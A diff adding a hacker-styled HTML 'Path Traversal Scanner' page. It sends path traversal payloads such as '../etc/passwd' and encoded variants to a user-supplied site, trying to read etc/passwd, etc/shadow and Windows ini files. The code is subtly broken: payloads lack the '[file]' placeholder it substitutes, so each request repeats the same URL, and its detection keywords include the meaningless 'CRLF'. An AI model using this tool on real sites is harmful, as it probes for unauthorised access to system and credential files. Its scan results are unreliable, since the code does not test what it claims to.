@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Path Traversal Scanner</title>
+  <style>
+    /* Same styles as original */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    
+    /* Media player styling */
+    video#bg-video {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw;
+      min-height: 100vh;
+      object-fit: cover;
+      opacity: 0.2;
+      z-index: -2;
+    }
+    
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    
+    .container {
+      max-width: 920px;
+      margin: 50px auto;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
+    }
+    
+    /* Heading and text color changes */
+    h1, h3, label {
+      color: #c58b00;
+    }
+    
+    input, textarea, pre, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.5);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    
+    button {
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    
+    button:hover {
+      background: #000;
+      color: red;
+    }
+    
+    .section {
+      margin-top: 20px;
+    }
+    
+    .traversal-result {
+      border-bottom: 1px solid #ffcc00;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ffaa00;
+    }
+    
+    .scan-section pre {
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Media players -->
+<video id="bg-video" autoplay muted loop playsinline>
+  <source src="background/1761817527453041720p.mp4" type="video/mp4">
+</video>
+<audio id="bg-music" loop>
+  <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
+  <h1>Path Traversal Scanner</h1>
+  
+  <label for="target-directory">Target Directory:</label>
+  <input id="target-directory" placeholder="https://example.com/directory/">
+  
+  <label for="payload-select">Select Payload:</label>
+  <select id="payload-select">
+    <option value="../etc/passwd">Linux (../etc/passwd)</option>
+    <option value="../../../../../../windows/win.ini">Windows (../../ windows/win.ini)</option>
+    <option value="%2e%2e%2fetc%2fpasswd">Encoded Linux (%2e%2e/etc/passwd)</option>
+  </select>
+  
+  <button onclick="testTraversal()">Scan</button>
+  
+  <div class="section">
+    <h3>Scan Results:</h3>
+    <div id="results-container"></div>
+    
+    <h3>Vulnerable Files:</h3>
+    <div id="vulnerable-files" class="scan-section"></div>
+    
+    <h3>Http Responses:</h3>
+    <pre id="http-responses" class="scan-section"></pre>
+  </div>
+</div>
+
+<script>
+  // Initialize media players
+  const musicPlayer = document.getElementById('bg-music');
+  window.addEventListener('click', () => {
+    musicPlayer.play().catch(() => {});
+  }, { once: true });
+  
+  function testTraversal() {
+    const directory = document.getElementById('target-directory').value.trim();
+    const selectedPayload = document.getElementById('payload-select').value;
+    
+    if (!directory) {
+      alert('Please provide a directory path.');
+      return;
+    }
+    
+    const resultsContainer = document.getElementById('results-container');
+    const vulnerableFilesDiv = document.getElementById('vulnerable-files');
+    const httpResponses = document.getElementById('http-responses');
+    
+    resultsContainer.innerHTML = '';
+    vulnerableFilesDiv.innerHTML = '';
+    httpResponses.innerHTML = '';
+    
+    const url = new URL(directory);
+    const basePath = url.origin + url.pathname.replace(/[^\/]+$/, '');
+    
+    scanForPaths(basePath, selectedPayload)
+      .then(results => {
+        showResults(results);
+      })
+      .catch(error => {
+        resultsContainer.innerHTML = 'Error during scanning: ' + error;
+      });
+  }
+  
+  async function scanForPaths(basePath, payload) {
+    const sensitiveFiles = [
+      'etc/passwd',
+      'etc/shadow',
+      'etc/hosts',
+      'etc/hostname',
+      'windows/win.ini',
+      'windows/system.ini'
+    ];
+    
+    const results = {
+      foundVulnerabilities: false,
+      vulnerableFiles: [],
+      responses: []
+    };
+    
+    for (const file of sensitiveFiles) {
+      try {
+        const path = payload.replace(/\[file\]/g, file);
+        const url = basePath + path;
+        
+        const response = await fetch(url);
+        const responseText = await response.text();
+        
+        results.responses.push({
+          url,
+          status: response.status,
+          size: responseText.length
+        });
+        
+        if (isPotentialVulnerability(response, responseText)) {
+          results.foundVulnerabilities = true;
+          results.vulnerableFiles.push(file);
+        }
+      } catch (error) {
+        console.error('Error fetching:', error);
+      }
+    }
+    
+    return results;
+  }
+  
+  function isPotentialVulnerability(response, text) {
+    // Simplified check for demonstration
+    return response.status === 200 &&
+           ['root:x', 'CRLF', 'boot loader'].some(keyword => 
+             text.toLowerCase().includes(keyword.toLowerCase()));
+  }
+  
+  function showResults(results) {
+    const container = document.getElementById('results-container');
+    const vulnerableFilesDiv = document.getElementById('vulnerable-files');
+    const httpResponses = document.getElementById('http-responses');
+    
+    if (results.foundVulnerabilities) {
+      container.classList.add('vulnerable');
+      container.innerHTML = `<strong>Potential Path Traversal Vulnerabilities Found!</strong>`;
+      
+      vulnerableFilesDiv.innerHTML = '<ul>';
+      for (const file of results.vulnerableFiles) {
+        vulnerableFilesDiv.innerHTML += `<li>${file} [VULNERABLE]</li>`;
+      }
+      vulnerableFilesDiv.innerHTML += '</ul>';
+    } else {
+      container.innerHTML = `<p>No clear path traversal vulnerabilities detected.</p>`;
+    }
+    
+    httpResponses.innerHTML = JSON.stringify(results.responses, null, 2);
+  }
+</script>
+</body>
+</html>
